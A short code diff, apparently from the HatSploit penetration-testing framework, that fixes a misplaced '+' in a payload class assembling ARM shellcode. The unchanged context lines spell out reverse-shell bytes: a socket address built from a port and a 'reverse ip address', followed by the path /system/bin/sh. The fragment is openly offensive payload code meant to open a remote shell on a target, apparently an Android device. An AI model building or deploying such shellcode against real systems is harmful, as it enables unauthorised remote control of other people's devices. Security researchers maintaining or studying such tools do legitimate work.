@@ -98,7 +98,7 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
             b"\x69\x46\x0b\x27"
             b"\x01\xDF\xC0\x46"
             b"\x02\x00" + local_port +       # "\x12\x34" struct sockaddr and port
-            + local_host +                   # reverse ip address
+            local_host +                     # reverse ip address
             b"\x2f\x73\x79\x73\x74\x65\x6d"  # /system
             b"\x2f\x62\x69\x6e"              # /bin
             b"\x2f\x73\x68\x00"              # /sh\0
